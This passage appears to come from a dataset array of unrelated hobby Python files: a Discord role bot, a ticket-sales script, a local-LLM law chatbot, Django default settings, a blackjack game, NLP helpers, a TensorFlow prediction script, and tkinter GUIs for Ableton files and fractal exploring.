channel\n                    break\n            return\n        case \"!ununionize\":\n            role = discord.utils.get(message.guild.roles, name=\"Unionizing\")\n            for member in union_members:\n                if role in member.roles:\n                    await member.remove_roles(role)\n            union_members = set()\n            return\n        case \"!setunionchannel\":\n            for channel in message.guild.channels:\n                if channel.name == param:\n                    unionthread = channel\n                    break\n            return\n        case \"!unionsay\":\n            if(outputchannel is not None):\n                await outputchannel.send(param)\n            return\n        case \"!init\":\n            if not initialized:\n                initialized = True\n            return\n        case \"!uninit\":\n            if initialized:\n                initialized = False\n            return\n\n#Event: Message is received\n@bot.event\nasync def on_message(message):\n    global union_members\n    global initialized\n    global unionthread\n    if message.channel.name == 'bot-testing':\n        await handle_bot_command(message)\n        return\n    if initialized:\n        if message.content == \"!unionize\" :\n            role = discord.utils.get(message.guild.roles, name=\"Unionizing\")\n            user = discord.utils.get(message.guild.members, id=message.author.id)\n            if role not in user.roles:\n                await user.add_roles(role)\n                union_members.add(user)\n                await unionthread.send(f'{message.author.display_name} has joined the Union! Together, we are stronger. - WolverineSoft Union')\n\n\n# Run the bot\nbot.run('get ur own token')",
    "# functions go here\r\n\r\n#checks user has entered yes / no to a question\r\ndef yes_no(question):\r\n    while True:\r\n        response = input(question).lower()\r\n\r\n        if response == \"yes\" or response == \"y\":\r\n            return \"yes\"\r\n\r\n        elif response == \"no\" or response == \"n\":\r\n            return \"no\"\r\n        \r\n        else:\r\n            print(\"Please enter yes or no\")\r\n\r\n#checks that user response is not blank\r\ndef not_blank(question):\r\n\r\n    while True:\r\n        response = input(question)\r\n\r\n        #if the responce is blank, outputs error\r\n        if response == \"\":\r\n            print(\"Sorry this cannot be blank. Please try again\")\r\n        else:\r\n            return response\r\n#routine starts here\r\n\r\n# set maximum number of tickets below\r\nMAX_TICKETS = 3\r\ntickets_sold = 0\r\n#Ask user if they want to see the instructions\r\nwhile True:\r\n    want_instructions = yes_no(\"Do you want to read the instructions? \")\r\n\r\n    if want_instructions == \"yes\":\r\n        print(\"Instructions go here\")\r\n# loop to sell tickets\r\nwhile tickets_sold < MAX_TICKETS:\r\n    name = not_blank(\"Enter your name (or 'xxx' to quit) \")\r\n\r\n    if name == 'xxx':\r\n        break\r\n    \r\n    tickets_sold += 1\r\n#Output number of tickets sold\r\n    if tickets_sold == MAX_TICKETS:\r\n        print(\"Congradulations you have sold all the tickets\")\r\n\r\n    else:\r\n        print(\"You have sold {} ticket/s. There is {} ticket/s remaining\".format(tickets_sold, MAX_TICKETS - tickets_sold))",
    "from langchain_community.vectorstores import FAISS\r\nfrom langchain_community.embeddings import HuggingFaceEmbeddings\r\nfrom langchain import PromptTemplate\r\nfrom langchain_community.llms import LlamaCpp\r\nfrom langchain.chains import RetrievalQA\r\nimport streamlit as st\r\nfrom htmlTemplates import bot_template , user_template , css\r\nimport torch\r\n\r\ndef set_prompt():\r\n    custom_prompt_template = \"\"\"[INST] <<SYS>>\r\n    You are a trained to guide people about Indian Law. You will answer user's query with your knowledge and the context provided. \r\n    <</SYS>>\r\n    Use the following pieces of context to answer the users question in short paragraphs.\r\n    Context : {context}\r\n    Question : {question}\r\n    Answer : [/INST]\r\n    \"\"\"\r\n\r\n    prompt = PromptTemplate(template=custom_prompt_template, input_variables=[\"context\", \"question\"])\r\n    return prompt\r\n\r\n\r\ndef retrieval_qa_chain(llm, prompt, db):\r\n    qa_chain = RetrievalQA.from_chain_type(\r\n        llm=llm,\r\n        chain_type='stuff',\r\n        retriever=db.as_retriever(search_kwargs={'k': 4}),\r\n        chain_type_kwargs={'prompt': prompt}\r\n    )\r\n\r\n    return qa_chain\r\n\r\ndef qa_pipeline():\r\n    # Load the HuggingFace embeddings\r\n    device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\r\n    embeddings = HuggingFaceEmbeddings(model_kwargs = {'device': device})\r\n\r\n    # Load the index\r\n    db = FAISS.load_local(\"vectorstore\", embeddings , allow_dangerous_deserialization=True)\r\n\r\n    # Load the LLM\r\n    llm = LlamaCpp(model_path = path , temperature = 0.2 , n_ctx = 8196 , n_batch = 256 , n_gpu_layers = -1 , verbose = False )\r\n    print(path)\r\n    # Set the custom prompt template\r\n    qa_prompt = set_prompt()\r\n\r\n    # Create the retrieval QA chain\r\n    chain = retrieval_qa_chain(llm, qa_prompt, db)\r\n    return chain\r\n\r\ndef handle_user_input(user_question):\r\n    with st.spinner(\"Generating response ...\"):\r\n        response = chain(user_question)\r\n        response = response['result']\r\n        st.session_state.chat_history.append({\"User\": user_question, \"Bot\": response})\r\n        \r\n\r\nst.set_page_config(page_title = \"Your personal Law ChatBot\", page_icon = \":bot:\")\r\nst.write(css , unsafe_allow_html=True)\r\n\r\nglobal chain, path\r\n\r\nwith st.sidebar:\r\n    model = st.selectbox(\"Select Model :\",(\"Llama2 7b (Faster)\" , \"Llama2 13b (Can answer complex queries)\"))\r\n    if model == 'Llama2 13b (Can answer complex queries)':\r\n        path = \"Models/llama-2-13b-chat.Q4_K_M.gguf\"\r\n\r\n    elif model == 'Llama2 7b (Faster)':\r\n        path = \"Models/llama-2-7b-chat.Q4_K_M.gguf\"\r\n\r\nchain = qa_pipeline()\r\n\r\nif \"chat_history\" not in st.session_state:\r\n  st.session_state.chat_history = []\r\n\r\nst.header(\"Your personal Law ChatBot :books:\")\r\n\r\nuser_question = st.chat_input(\"Ask a question :\")\r\nif user_question:\r\n  handle_user_input(user_question)\r\n\r\nfor chat in st.session_state.chat_history:\r\n   st.write(user_template.replace(\"{{MSG}}\",chat[\"User\"]),unsafe_allow_html=True)\r\n   st.write(bot_template.replace(\"{{MSG}}\",chat[\"Bot\"]),unsafe_allow_html=True)\r\n",
    "\"\"\"\nDjango settings for root project.\n\nGenerated by 'django-admin startproject' using Django 5.0.4.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/5.0/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/5.0/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/5.0/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'django-insecure-y8!8&jzae4#hul26%z$*wc!$cc1uximi(zac2x(baiqbg+&^o#'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = ['problemfinder.onrender.com','127.0.0.1']\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'django_filters',\n    'rest_framework',\n    'search',\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'root.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'root.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/5.0/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR / 'db.sqlite3',\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/5.0/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/5.0/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/5.0/howto/static-files/\n\nSTATIC_URL = 'static/'\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/5.0/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n\n",
    "import random\ntotalUser=0\ntotalComputer=0\nname=input(\"Enter you name:\")\nprint(f\"----------------Hey {name} Welcome to the game!!-----------------------\\n\")\nprint(\"----------------Aayiye Dekhte hain maja aayega---------------------\\n\")\n\n\ndef dealCards():  \n    cardPoint=[11,2,3,4,5,6,7,8,9,10,10,10,10]\n    return random.choice(cardPoint)\n\ndef sumCards(hand):\n    \"\"\"Calculate the total value of a hand.\"\"\"\n    total = sum(hand)\n    # Adjust for Aces\n    num_aces = hand.count(11)\n    while total > 21 and num_aces:\n        total -= 10\n        num_aces -= 1\n    return total   \n        \ndef game():\n    \n    play=input(\"Do you want to play 'y' or 'n' : \")\n    if play!='y':\n        print(\"The game is over !\")\n        return\n    userCard=[dealCards(),dealCards()]\n    computerChoice=[dealCards(),dealCards()]\n    \n    totalUser=sumCards(userCard)\n    totalComputer=sumCards(computerChoice)\n    \n    print(f\"Dealer in hand is {computerChoice}\",totalComputer)\n    print(f\"Your card in hand is {userCard}\", totalUser)\n    while totalUser<21:\n        choice=input(\"DO YOU WANT TO TAKE ANOTHER CARD?\")\n        if choice=='y':\n            userCard.append(dealCards())\n            totalUser=sumCards(userCard)\n            print(f\"Your card in hand is {userCard}\", totalUser)\n            \n        elif choice=='n':\n            break\n        else:\n            print(\"INVALID\")\n    if totalUser>21:\n        print(\"You busted.The Dealer win!\")\n    \n    \n    while totalComputer<17:\n        computerChoice.append(dealCards())\n        totalComputer=sumCards(computerChoice)\n        print(f\"Dealer in hand is {computerChoice}\",totalComputer)\n    if totalComputer >21:\n        print(f\"Hey {name} !!! You win\")\n    \nif totalComputer==totalUser:\n    print(\"Match Draw\\n\")\n        \n    \nelif totalUser>totalComputer:\n    print(f\"Hey {name} You win\")\nelif totalComputer>totalUser:\n    print(\"Busted...You loose\")     \ngame()",
    "import numpy as np\nimport nltk\nnltk.download('punkt')\nfrom nltk.stem.porter import PorterStemmer\nstemmer = PorterStemmer()\n\ndef tokenize(sentence):\n    \"\"\"\n    split sentence into array of words/tokens\n    a token can be a word or punctuation character, or number\n    \"\"\"\n    return nltk.word_tokenize(sentence)\n\n\ndef stem(word):\n    \"\"\"\n    stemming = find the root form of the word\n    examples:\n    words = [\"organize\", \"organizes\", \"organizing\"]\n    words = [stem(w) for w in words]\n    -> [\"organ\", \"organ\", \"organ\"]\n    \"\"\"\n    return stemmer.stem(word.lower())\n\n\ndef bag_of_words(tokenized_sentence, words):\n    \"\"\"\n    return bag of words array:\n    1 for each known word that exists in the sentence, 0 otherwise\n    example:\n    sentence = [\"hello\", \"how\", \"are\", \"you\"]\n    words = [\"hi\", \"hello\", \"I\", \"you\", \"bye\", \"thank\", \"cool\"]\n    bog   = [  0 ,    1 ,    0 ,   1 ,    0 ,    0 ,      0]\n    \"\"\"\n    # stem each word\n    sentence_words = [stem(word) for word in tokenized_sentence]\n    # initialize bag with 0 for each word\n    bag = np.zeros(len(words), dtype=np.float32)\n    for idx, w in enumerate(words):\n        if w in sentence_words: \n            bag[idx] = 1\n\n    return bag",
    "import tensorflow as tf\nimport os,sys\nfrom sklearn.preprocessing import StandardScaler\nimport pandas as pd\n\n\ndef resource_path(relative_path):\n    \"\"\" Get absolute path to resource, works for dev and for PyInstaller \"\"\"\n    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))\n    return os.path.join(base_path, relative_path)\n\nversion = 4\n\nX_train = pd.read_csv(resource_path(f'X_train_load{version}.csv'),index_col=False)\nscaler = StandardScaler()\nX_train_scaled = scaler.fit_transform(X_train)\n\n\nsaved_model = tf.keras.models.load_model(resource_path(f\"TF_model_prototipe{version}\"))\n\n\n\n\nVELOCIDAD = 239\nHARDENING_TEMP = 944.9\nHARDENING_VOLT = 544\nTEMPERING_TEMP = 470\nTEMPERING_VOLT = 196\nHARDENING_AMP = 529\nHARDENING_FREQ = 311\nHARDENING_POW = 232\nQuenching_Temp = 860.9\nline = 1\nHARDENING_FLUJO_1 = 2129\nHARDENING_FLUJO_2 = 2303\nHARDENING_FLUJO_3 = 702\nHARDENING_FLUJO_4 = 1122\nHARDENING_FLUJO_5 = 1188\nTEMPERING_FLUJO_1 = 1218\nTEMPERING_FLUJO_2 = 1128\nTEMPERING_FLUJO_3 = 1020\nTEMPERING_FLUJO_4 = 690\nTEMP_AGUA_HARDENING = 31.5\nTEMP_AGUA_TEMPERING = 31.5\nDiam = 14.10\n\n#valor 1971\n\nscaled = scaler.transform([[VELOCIDAD,HARDENING_TEMP,HARDENING_VOLT,TEMPERING_TEMP,TEMPERING_VOLT,HARDENING_FLUJO_1,HARDENING_FLUJO_2,HARDENING_FLUJO_3,HARDENING_FLUJO_4,HARDENING_FLUJO_5,TEMPERING_FLUJO_1,TEMPERING_FLUJO_2,TEMPERING_FLUJO_3,TEMPERING_FLUJO_4,TEMP_AGUA_HARDENING,TEMP_AGUA_TEMPERING,HARDENING_AMP,HARDENING_FREQ,HARDENING_POW,Quenching_Temp,line,Diam]])\n#scaled = scaler.transform([[VELOCIDAD,HARDENING_VOLT,TEMPERING_VOLT,TEMP_AGUA_HARDENING,TEMP_AGUA_TEMPERING,HARDENING_AMP,HARDENING_FREQ,HARDENING_POW,Quenching_Temp,line,Diam]])\n\nprint(saved_model.predict(scaled))\n\n\nVELOCIDAD = 229\nHARDENING_TEMP = 949\nHARDENING_VOLT = 510\nTEMPERING_TEMP = 496.39\nTEMPERING_VOLT = 203\nHARDENING_AMP = 189\nHARDENING_FREQ = 318\nHARDENING_POW = 189\nQuenching_Temp = 853.90\nline = 3\nHARDENING_FLUJO_1 = 2021\nHARDENING_FLUJO_2 = 2195\nHARDENING_FLUJO_3 = 984\nHARDENING_FLUJO_4 = 1440\nHARDENING_FLUJO_5 = 1476\nTEMPERING_FLUJO_1 = 1110\nTEMPERING_FLUJO_2 = 1488\nTEMPERING_FLUJO_3 = 1182\nTEMPERING_FLUJO_4 = 942\nTEMP_AGUA_HARDENING = 30.10\nTEMP_AGUA_TEMPERING = 30\nDiam = 13.10\n\n#valor 1997\n\nscaled = scaler.transform([[VELOCIDAD,HARDENING_TEMP,HARDENING_VOLT,TEMPERING_TEMP,TEMPERING_VOLT,HARDENING_FLUJO_1,HARDENING_FLUJO_2,HARDENING_FLUJO_3,HARDENING_FLUJO_4,HARDENING_FLUJO_5,TEMPERING_FLUJO_1,TEMPERING_FLUJO_2,TEMPERING_FLUJO_3,TEMPERING_FLUJO_4,TEMP_AGUA_HARDENING,TEMP_AGUA_TEMPERING,HARDENING_AMP,HARDENING_FREQ,HARDENING_POW,Quenching_Temp,line,Diam]])\n#scaled = scaler.transform([[VELOCIDAD,HARDENING_VOLT,TEMPERING_VOLT,TEMP_AGUA_HARDENING,TEMP_AGUA_TEMPERING,HARDENING_AMP,HARDENING_FREQ,HARDENING_POW,Quenching_Temp,line,Diam]])\nprint(saved_model.predict(scaled))\n\n\nVELOCIDAD = 245\nHARDENING_TEMP = 925.7\nHARDENING_VOLT = 575\nTEMPERING_TEMP = 488.2\nTEMPERING_VOLT = 195\nHARDENING_AMP = 305\nHARDENING_FREQ = 296\nHARDENING_POW = 120\nQuenching_Temp = 886.59\nline = 1\nHARDENING_FLUJO_1 = 2651\nHARDENING_FLUJO_2 = 2237\nHARDENING_FLUJO_3 = 780\nHARDENING_FLUJO_4 = 1458\nHARDENING_FLUJO_5 = 1140\nTEMPERING_FLUJO_1 = 1356\nTEMPERING_FLUJO_2 = 1248\nTEMPERING_FLUJO_3 = 1212\nTEMPERING_FLUJO_4 = 858\nTEMP_AGUA_HARDENING = 26.39\nTEMP_AGUA_TEMPERING = 26.29\nDiam = 13.80\n\n#valor 1999\n\nscaled = scaler.transform([[VELOCIDAD,HARDENING_TEMP,HARDENING_VOLT,TEMPERING_TEMP,TEMPERING_VOLT,HARDENING_FLUJO_1,HARDENING_FLUJO_2,HARDENING_FLUJO_3,HARDENING_FLUJO_4,HARDENING_FLUJO_5,TEMPERING_FLUJO_1,TEMPERING_FLUJO_2,TEMPERING_FLUJO_3,TEMPERING_FLUJO_4,TEMP_AGUA_HARDENING,TEMP_AGUA_TEMPERING,HARDENING_AMP,HARDENING_FREQ,HARDENING_POW,Quenching_Temp,line,Diam]])\n#scaled = scaler.transform([[VELOCIDAD,HARDENING_VOLT,TEMPERING_VOLT,TEMP_AGUA_HARDENING,TEMP_AGUA_TEMPERING,HARDENING_AMP,HARDENING_FREQ,HARDENING_POW,Quenching_Temp,line,Diam]])\nprint(saved_model.predict(scaled))",
    "#Funktionen\nimport tkinter as tk\nimport os\nimport subprocess\n\n\ndef open_live(file_path, text_box):\n\n\tprint(\"+ \")\n\tprint(file_path)\n\n\twith open(new_prog_path, 'r') as file:\n\t\tprogram = file.readline().strip()\n\n\n\ttry:\n\t\tsubprocess.run([\"open\", \"-a\", program, file_path])\n\texcept FileNotFoundError:\n\t\tprint(\"+ 0\")\n\texcept subprocess.CalledProcessError:\n\t\tprint(\"The File couldnt be opend\")\n\t\tmessage = \"Live files can not be opend with the given program. Enter a valid program-name!\"\n\t\tnew_prog_message(text_box, message, \"\")\n\n\t#print(\"+ programm \u00f6ffnen ende\")\n\ndef old_find_folder(path):\n\ttry: \n\t\twith open(path, 'r') as file:\n\t\t\tfirst_line = file.readline().strip()\n\t\t\tif first_line.startswith(\"/\"):\n\t\t\t\treturn first_line\n\t\t\telse:\n\t\t\t\t#print(\"nothing found\")\n\t\t\t\treturn \"0\"\n\n\texcept FileNotFoundError:\n\t\t#print(\"txt file not found\")\n  \t\tpass\n\ndef find_folder():\n\n\ttxt_file = \".abl_folder_path.txt\"\n\tsrt_path = os.getcwd()\n\t#srt_path_only = os.path.dirname(srt_path)\n\ttxt_file_full = os.path.join(srt_path, txt_file)\n\n\tif os.path.exists(txt_file_full):\n\t\t#print(\"+ txt path exists\")\n\t\t#print(txt_file_full)\n\t\tpass\n\telse:\n\n\t\t#print(\"+ txt file dosnt exist\")\n\t\t\n\t\twith open(txt_file_full, 'w') as file:\n\t\t\t#file.write(\"created\")\n\t\t\tpass\n\n\t\treturn 0\n\t\n\ttry: \n\t\twith open(txt_file_full, 'r') as file:\n\t\t\tfirst_line = file.readline().strip()\n\t\t\treturn first_line\n\n\texcept FileNotFoundError:\n\t\tprint(\"txt file not found\")\n\t\treturn \"\"\n\n\n\n\ndef save_filepath(entry, txt_file, txt_box, frame, text_box_prog):\n\tfile_path = entry.get()\n\tif file_path.strip() == \"\":\n\t\t#print(\"enter proper Path\")\n\t\treturn\n\n\twith open(txt_file, 'w') as file:\n\t\tfile.write(file_path)\n\n\tfor widget in frame.winfo_children(): #destroying existing buttons of old folder files\n\t\tif isinstance(widget, tk.Button):\n\t\t\twidget.destroy()\n\t\n\tif os.path.exists(file_path):\n\t\tmessage = \"Your current folder is: \"\n\t\t#print(message)\n\t\t\n\t\tnew_message(txt_box, message, file_path)\n\n\t\tfor widget in frame.winfo_children():\n\t\t\tif isinstance(widget, tk.Button):\n\t\t\t\twidget.destroy()\n\n\t\tals_files_ausgeben(frame, file_path, text_box_prog)\n\telse:\n\t\tmessage = \"The given path does not exist. Enter an existing one!\"\n\t\tnew_message(txt_box, message, \"\")\n\t\n\n\t#leert das Eingabefeld\n\tentry.delete(0, tk.END)\n\ndef messagebox(root, message, folder_path):\n\n\ttext_box = tk.Text(root, wrap=tk.WORD, height=3, width=70, bg=\"black\", fg=\"olivedrab1\") #orchid1\n\ttext_box.insert(tk.END, message + folder_path)\n\ttext_box.place(relx=0, rely=0.15)\n\n\treturn text_box\n\ndef new_message(text_box, message, folder_path):\n\ttext_box.delete(\"1.0\", tk.END)\n\ttext_box.insert(tk.END, message + folder_path)\n\n\ndef eingabe(root):\n\t#Label f\u00fcr das eingabefeld wird erstellt\n\t#label = tk.Label(root, text=\"Enter the Path to a Folder:\")\n\t#label.place(relx=0.3, rely=0.1)\n\t#label.grid(row=9, pady=2)\n\n\t#erstellt das eingabefeld\n\tentry = tk.Entry(root, width=25)\n\tentry.place(relx=0.05, rely=0.24)\n\t#entry.grid(row=10, column=0, pady=5)\n\n\treturn entry\n\ndef als_files_ausgeben(frame, folder_path, text_box):\n\tcount = 0\n\tableton_files = []\n\texclude = \"Backup\"\n\tfor root, dirs, files in os.walk(folder_path, topdown=True):\n\t\t#print(files)\n\t\tif 'Backup' in dirs:\n\t\t\tdirs.remove('Backup') #So wird backup ordner nicht ber\u00fccksichtigt\n\n\t\tfor file in files:\n\t\t\tif file.endswith(\".als\"):\n\t\t\t\tfile_path = os.path.join(root, file) #Damit wird der File path und der name der .als datei zusammengef\u00fcgt. Dadurch hat man gesammten Path der File\n\t\t\t\tmodified_time = os.path.getmtime(file_path)\n\t\t\t\tableton_files.append((file_path, modified_time))\n\t\t\t\tcount = count + 1\n\n\t\t\tif count == 10000:\n\t\t\t\tbreak\n\t\t\n\t\tif count == 10000:\n\t\t\tbreak\n\t#print(ableton_files)\n\t#for file in os.listdir(folder_path):\n\t#\tif file.endswith(\".als\"):\n\t#\t\tfile_path = os.path.join(folder_path, file) #Damit wird der File path und der name der .als datei zusammengef\u00fcgt. Dadurch hat man gesammten Path der File\n\t#\t\tmodified_time = os.path.getmtime(file_path)\n\t#\t\tableton_files.append((file, modified_time)) # packt die modifizierte zeit ans ende der Liste ((File, Time) (File, Time) (File, Time) ...) Man hat Tuples in der Liste. Die tuppel entstehn durch das append\n\n\tif len(ableton_files) == 0:\n\t\treturn \"0\"\n\n\tableton_files.sort(key=lambda x: x[1], reverse=True) # die Liste wird sortiert\n\n\tcount2 = 0\n\tcount = 0\n\tfor file, _ in ableton_files:\n\n\t\tfile_name = os.path.basename(file)\n\t\t \n\t\ty_pos = 20 + count\n\n\n\t\tbutton = tk.Button(frame, text=file_name, bd=0, relief=\"flat\" ,command= lambda f=file: open_live(f, text_box)) #nicht n\u00f6tig: os.path.join(folder_path, file)\n\t\t\n\n\t\tbutton.place(x=200, y=y_pos, anchor=\"center\")\n\t\tcount = count + 30\n\t\tcount2 = count2 + 1\n\n\t\tif count2 == 175:\n\t\t\t\n\t\t\t#print(files)\n\t\t\t#print(len(files))\n\t\t\tbreak\n\ndef prog_find(root):\n\n\tfilename = \".abl_prog.txt\"\n\tsrt_path = os.getcwd()\n\n\tfile_path = os.path.join(srt_path, filename)\n\n\tglobal new_prog_path #da wird der neue programname gespeichert\n\tnew_prog_path = file_path \n\t\n\tif os.path.exists(file_path):\n\t\t#print(\"+ path exists\")\n\t\tpass\n\telse:\n\n\t\t#print",
    "from .processor_bart_text_summary import BartTextSummaryProcessor\nfrom .processor_base import BaseProcessor\nfrom .processor_gpt4 import GPT4Processor\nfrom .processor_gpt4_speaker_intent import GPT4SpeakerIntentProcessor\nfrom .processor_gpt4_text_emotion import GPT4TextEmotionProcessor\nfrom .processor_gpt4_text_summary import GPT4TextSummaryProcessor\nfrom .processor_gpt4v import GPT4VProcessor\nfrom .processor_gpt4v_cloth_fashion import GPT4VClothFashionProcessor\nfrom .processor_gpt4v_face_emotion import GPT4VFaceEmotionProcessor\nfrom .processor_gpt4v_ocr import GPT4VOCRProcessor\nfrom .processor_gpt4v_posture import GPT4VPostureProcessor\nfrom .processor_gpt4v_scene_location import GPT4VSceneLocationProcessor\nfrom .processor_roberta_text_sentiment import (\n    RobertaTextSentimentProcessor,\n)\n\n__all__ = [\n    \"BaseProcessor\",\n    \"GPT4VProcessor\",\n    \"GPT4VSceneLocationProcessor\",\n    \"GPT4VOCRProcessor\",\n    \"GPT4VClothFashionProcessor\",\n    \"GPT4VFaceEmotionProcessor\",\n    \"GPT4VPostureProcessor\",\n    \"RobertaTextSentimentProcessor\",\n    \"BartTextSummaryProcessor\",\n    \"GPT4SpeakerIntentProcessor\",\n    \"GPT4TextEmotionProcessor\",\n    \"GPT4TextSummaryProcessor\",\n    \"GPT4Processor\",\n]\n",
    "from PIL import Image, ImageTk\nimport time\nimport tkinter as tk\nfrom tkinter import ttk\nfrom tkinter import PhotoImage\nimport keyboard\nimport numpy as np\n\n# cr\u00e9ation de toutes les fen\u00e8tres\ndef afficher_nouvelle_fenetre(message):\n    fenetre.withdraw()  # Masque la fen\u00eatre actuelle\n    nouvelle_fenetre = Toplevel(fenetre)\n    nouvelle_fenetre.title(\"Nouvelle Fen\u00eatre\")\n    nouvelle_fenetre.geometry(\"720x555\")  # D\u00e9finir la m\u00eame taille que la fen\u00eatre principale\n    Label(nouvelle_fenetre, text=message).pack(padx=20, pady=20)\n\ndef affiche_acceuil():\n    cadre_pile.append(cadre_acceuil)  # Ajouter le cadre actuel \u00e0 la pile\n    afficher_cadre(cadre_acceuil)\n\ndef affiche_tuto():\n    cadre_pile.append(cadre_tuto)  # Ajouter le cadre actuel \u00e0 la pile\n    afficher_cadre(cadre_tuto)\n\ndef affiche_biblio():\n    cadre_pile.append(cadre_biblio)  # Ajouter le cadre actuel \u00e0 la pile\n    afficher_cadre(cadre_biblio)\n    \ndef afficher_cadre(cadre):\n    for c in [cadre_acceuil, cadre_tuto, cadre_biblio]:\n        c.pack_forget()\n    cadre.pack()\n\n\n\nglobal xmax, xmin, ymax, ymin, r\u00e9so_x, r\u00e9so_y, r, g, b, palette #variable de o\u00f9 je suis dans la fractale\n#valeurs de base\nxmax = 2\nxmin = -2\nymax = 1.3875\nymin = -1.387\nr\u00e9so_x = 320\nr\u00e9so_y = 222\npalette = []\n\n#g\u00e9n\u00e9ration de la fen\u00e8tre\nfenetre = tk.Tk()\n\nfenetre.title(\"L'exploreur de fractale\")\nfenetre.geometry(\"720x555\")\nfenetre.config(bg=\"#C2C2C2\")\nfenetre.iconbitmap(\"Explorer_image/logo.ico\")\nfenetre.minsize(720,555)\nfenetre.maxsize(720,555)\n\ncadre_acceuil = tk.Frame(fenetre, bg=\"#C2C2C2\",heigh = 555,width=720)\ncadre_acceuil.pack_propagate(False) \ncadre_tuto = tk.Frame(fenetre, bg=\"#C2C2C2\",heigh = 555,width=720)\ncadre_tuto.pack_propagate(False)\ncadre_biblio = tk.Frame(fenetre, bg=\"#C2C2C2\",heigh = 555,width=720)\ncadre_biblio.pack_propagate(False) \n\ntitre_biblio = tk.Label(cadre_biblio, text=\"Bblioth\u00e8que\", font=(\"Consolas\", 20), bg=\"#C2C2C2\", fg=\"black\")\nsoustitre_biblio = tk.Label(cadre_biblio, text=\"Vous cherchez un exemple de fractale ?\", font=(\"Consolas\", 15), bg=\"#C2C2C2\", fg=\"black\")\ntitre_biblio.pack()\nsoustitre_biblio.pack(pady=10)\n\ndef image_biblio(image,x,y):\n    img = PhotoImage(file=image)\n    image_frame = tk.Label(cadre_biblio, image=img)\n    image_frame.image = img\n    image_frame.place(x=x,y=y)\n    cadre_biblio.update() \n    \nimage_biblio(\"Bibliotheque_image/1.png\",100,10)\n\ntitre_tuto = tk.Label(cadre_tuto, text=\"Guide des Touches\", font=(\"Consolas\", 20), bg=\"#C2C2C2\", fg=\"black\")\nsoustitre_tuto = tk.Label(cadre_tuto, text=\"Vous vous sentez un peux  perdu ?\", font=(\"Consolas\", 15), bg=\"#C2C2C2\", fg=\"black\")\ntitre_tuto.pack()\nsoustitre_tuto.pack(pady=10)\n\ntexte_tuto = tk.Label(cadre_tuto, text=\"z - aller vers le haut \\ns - aller vers le bas \\nq - aller \u00e0 droite \\nd - aller \u00e0 gauche \\n\\nfl\u00e8che du haut - zoom avant \\nfl\u00e8che du bas - zoom arri\u00e8re \\n\\nm - renvoie les coordonn\u00e9e de \\n    o\u00f9 vous \u00e9tes dans la fractale \\n\\nc - sauvegarde un PNG de ce que \\n    vous voyez dans le dossier Explorer_image \\n\", font=(\"Consolas\", 13), bg=\"#C2C2C2\", fg=\"black\")\ntexte_tuto.pack()\n\nfin = tk.Label(cadre_tuto, text=\"Amusez vous !\", font=(\"Consolas\", 15), bg=\"#C2C2C2\", fg=\"black\")\nfin.pack(pady=20)\n\ntitre_acceuil = tk.Label(cadre_acceuil, text=\"Bienvenue sur cet explorateur de fractales\", font=(\"Consolas\", 20), bg=\"#C2C2C2\", fg=\"black\")\nsoustitre_acceuil = tk.Label(cadre_acceuil, text=\"Choississez les param\u00e8tre de votre fractale\", font=(\"Consolas\", 15), bg=\"#C2C2C2\", fg=\"black\")\ntitre_acceuil.pack(pady=10)\nsoustitre_acceuil.place(x=130,y=50)\n\ndesc_liste_deroul_palette = tk.Label(cadre_acceuil, text=\"Choississez la palette de couleur que vous voulez utiliser\", font=(\"Consolas\", 12), bg=\"#C2C2C2\", fg=\"black\")\ndesc_liste_deroul_palette.place(x=15,y=100)\n#cr\u00e9ation de la liste d\u00e9roulante\nliste_choix = [\"Blanc - Jaune - Noir\",\"Blanc - Noir\",\"Noir - Bleu - Noir\",\"Blanc - Orange - Noir\",\"Arc-en-ciel\", \"Noir - Rouge - Noir\"]\nvariable_palette = tk.StringVar()\nvariable_palette.set(\"Blanc - 